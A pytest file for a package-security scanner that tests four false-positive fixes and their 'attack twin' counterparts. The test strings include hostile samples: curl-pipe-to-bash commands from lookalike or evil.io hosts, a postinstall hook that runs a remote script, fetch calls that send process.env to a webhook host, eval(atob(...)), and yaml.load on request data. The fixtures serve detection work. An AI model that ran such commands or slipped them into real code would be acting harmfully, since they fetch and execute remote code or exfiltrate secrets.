"""The most-adopted Do-not-connect catalog rows, 2026-11-10: four false-positive classes.

Every class pins both sides: the shape from the real package that is no longer critical
(or no longer a finding), and the attack twin that must still fire. Fixed by pattern
class, never by package name.

1. A minified class method DEFINITION named exec (`}async exec(t,r){`, pglite).
2. A bare host in a domain-list data file (the Public Suffix List, happy-dom).
3. A project's own `YAML` class read as PyYAML (`YAML.load(f)`, ultralytics).
4. The Hugging Face `hf` CLI installer as a vendor installer (huggingface-hub, gradio).
"""
from __future__ import annotations

import pytest

from src.scanner import pipe_shell
from src.scanner.scan import _scan_content


def _scan(code: str, path: str):
    findings, _, _ = _scan_content(code, path)
    return findings


def _named(findings, prefix: str, min_sev: str = "high"):
    order = ["info", "low", "medium", "high", "critical"]
    return [f for f in findings if f.name.startswith(prefix)
            and order.index(f.severity) >= order.index(min_sev)]


# ── 1. minified method definitions ────────────────────────────────────────────

_CP = "const { exec, spawn } = require('child_process');\n"


class TestMinifiedExecDefinition:
    @pytest.mark.parametrize("line", [
        # @electric-sql/pglite dist/index.cjs: PGlite#exec(sql) after another method
        "class P{async query(t){return 1}async exec(t,r){return await this._run(t,r)}}",
        "class P{x(){return 1}exec(t,r){return this.q(t)}}",
        "class P{x(){return 1};static exec(t){return t}}",
        "const o={a:1,exec(t){return t}};",
        "class P{x(){}*spawn(t){yield t}}",
    ])
    def test_definition_is_not_a_call(self, line):
        assert not _named(_scan(_CP + line + "\n", "dist/index.cjs"), "execSync / spawn", "low")

    @pytest.mark.parametrize("line", [
        # attack twins: a real call at the same boundaries
        "class P{x(){return 1}run(c){exec(c)}}",
        "function f(c){};exec(c);",
        "const o={a:1,b:exec(c)};",
        "x();exec(c)",
        "x();exec(c),{a:1}",
        "if(exec(c)){go()}",
        "while(exec(c)){go()}",
        "a?exec(c):{}",
        "class P{x(){return 1}async run(c){return exec(c)}}",
    ])
    def test_a_call_at_the_same_boundary_still_fires(self, line):
        # a call on a local value is medium (the shell ladder); what matters here is
        # that it is still a finding, not dropped as a definition
        assert _named(_scan(_CP + line + "\n", "dist/index.cjs"), "execSync / spawn",
                      "medium"), line


# ── 2. domain-list data files ─────────────────────────────────────────────────

def _psl(extra_top: str = "", hosts: tuple[str, ...] = ("ngrok.io", "webhook.site"),
         n: int = 400, tail: str = "") -> str:
    body = "".join(f"        '{lbl}{i}.example',\n" for i, lbl in
                   zip(range(n), ("a", "b", "c", "d") * n))
    tlds = "        'ac',\n        'com.ac',\n        'xn--p1ai',\n"
    picks = "".join(f"        '{h}',\n" for h in hosts)
    return ("// Generated by build-public-suffix-list.cjs. Do not edit manually.\n"
            "// Source: https://publicsuffix.org/list/public_suffix_list.dat\n"
            + extra_top + "export default {\n    exact: new Set([\n" + tlds + body + picks
            + "        'imagine-proxy.work',\n    ])\n};\n" + tail)


class TestDomainListData:
    def test_public_suffix_list_hosts_are_low(self):
        f = _scan(_psl(), "lib/cookie/PublicSuffixList.js")
        assert not _named(f, "Outbound webhook/exfil URL", "medium")
        assert len(_named(f, "Outbound webhook/exfil URL", "low")) == 2  # kept visible

    @pytest.mark.parametrize("tail", [
        # attack twins: the file itself sends to one of its hosts
        "fetch('https://' + hosts[0] + '/c', {method:'POST', body: process.env});\n",
        "require('https').request({host: list[3], path: '/x'}).end(secret);\n",
        "navigator.sendBeacon(u, data);\n",
        "// fetch(x)\n",  # a sink in a comment still counts: nothing hides behind one
        "eval(atob(p));\n",
    ])
    def test_a_sink_anywhere_in_the_file_keeps_the_critical(self, tail):
        f = _scan(_psl(tail=tail), "lib/cookie/PublicSuffixList.js")
        assert _named(f, "Outbound webhook/exfil URL", "critical"), tail

    def test_a_short_list_keeps_the_critical(self):
        f = _scan(_psl(n=50), "lib/hosts.js")
        assert _named(f, "Outbound webhook/exfil URL", "critical")

    def test_mostly_code_keeps_the_critical(self):
        code = "".join(f"const v{i} = compute({i});\n" for i in range(2000))
        f = _scan(_psl(tail=code), "lib/hosts.js")
        assert _named(f, "Outbound webhook/exfil URL", "critical")

    @pytest.mark.parametrize("line", [
        "        'https://webhook.site/abc',\n",
        "        'webhook.site/abc',\n",
        "        'x.ngrok.io:443',\n",
        "        url: 'webhook.site',\n",
    ])
    def test_a_url_or_keyed_value_in_a_list_keeps_the_critical(self, line):
        f = _scan(_psl(hosts=(), tail="").replace(
            "        'imagine-proxy.work',\n", line), "lib/hosts.js")
        assert _named(f, "Outbound webhook/exfil URL", "critical"), line

    def test_a_single_bare_host_in_code_keeps_the_critical(self):
        code = "const h = [\n  'webhook.site',\n];\npost(h[0], process.env);\n"
        assert _named(_scan(code, "index.js"), "Outbound webhook/exfil URL", "critical")


# ── 3. a project's own YAML class ─────────────────────────────────────────────

class TestOwnYamlClass:
    @pytest.mark.parametrize("code", [
        # ultralytics/cfg/__init__.py
        "from ultralytics.utils import (\n    LOGGER,\n    YAML,\n    colorstr,\n)\n"
        "def cfg2dict(cfg):\n    cfg = YAML.load(cfg)  # load dict\n",
        "from mypkg.io import YAML\nd = YAML.load('data.yaml')\n",
        # ultralytics/utils/__init__.py: the class itself
        "class YAML:\n    @classmethod\n    def load(cls, f):\n        return {}\n"
        "data = YAML.load('x.yaml')\n",
    ])
    def test_own_yaml_class_is_not_pyyaml(self, code):
        assert not _named(_scan(code, "ultralytics/cfg/__init__.py"), "yaml.load")

    @pytest.mark.parametrize("code", [
        # attack twins: the name is bound to PyYAML
        "import yaml as YAML\nd = YAML.load(open(p))\n",
        "import yaml\nYAML = yaml\nd = YAML.load(open(p))\n",
        "import os, yaml as Yaml\nd = Yaml.load(request.data)\n",
        "from yaml import load\nclass YAML: pass\nimport yaml as YAML\nYAML.load(s)\n",
        # the module itself, alongside an own class of another name
        "from mypkg.io import YAML\nimport yaml\nd = yaml.load(open(p))\n",
        # an own YAML class imported under an alias does not cover the bare name
        "from mypkg.io import YAML as Y\nimport yaml as YAML\nYAML.load(s)\n",
    ])
    def test_pyyaml_bindings_still_fire(self, code):
        assert _named(_scan(code, "loader.py"), "yaml.load"), code


# ── 4. the hf CLI installer ───────────────────────────────────────────────────

def _pipe(content: str, path: str) -> list:
    return [f for f in _scan(content, path) if f.name == pipe_shell.PIPE_TO_SHELL]


class TestHfInstaller:
    @pytest.mark.parametrize("line", [
        # huggingface_hub/cli/_cli_utils.py
        'return ["bash", "-c", f"curl -LsSf https://hf.co/cli/install.sh | bash{flags}"]',
        'return ["bash", "-c", "curl -LsSf https://hf.co/cli/install.sh | bash -s -- '
        '--with-transformers"]',
        "Install: `curl -LsSf https://huggingface.co/cli/install.sh | bash -s`.",
    ])
    def test_official_hf_installer_is_high(self, line):
        found = _pipe(line + "\n", "huggingface_hub/cli/_cli_utils.py")
        assert len(found) == 1 and found[0].severity == "high", found

    @pytest.mark.parametrize("line", [
        # attack twins: another path, http, a lookalike host, extra URL, insecure
        "curl -LsSf https://hf.co/evil/install.sh | bash",
        "curl -LsSf https://hf.co/spaces/x/raw/main/cli/install.sh | bash",
        "curl -LsSf http://hf.co/cli/install.sh | bash",
        "curl -LsSf https://hf.co.evil.io/cli/install.sh | bash",
        "curl -LsSf https://evil.hf.co/cli/install.sh | bash",
        "curl -k https://hf.co/cli/install.sh | bash",
        "curl https://hf.co/cli/install.sh https://evil.io/x | bash",
        "curl -LsSf https://hf.co/cli/install.sh --next https://evil.io/x | bash",
    ])
    def test_lookalikes_stay_critical(self, line):
        found = _pipe(line + "\n", "scripts/install.py")
        assert found and found[0].severity == "critical", line

    def test_install_hook_stays_critical(self):
        pkg = '{"scripts": {"postinstall": "curl -LsSf https://hf.co/cli/install.sh | bash"}}\n'
        found = _pipe(pkg, "package.json")
        assert found and all(f.severity == "critical" for f in found)
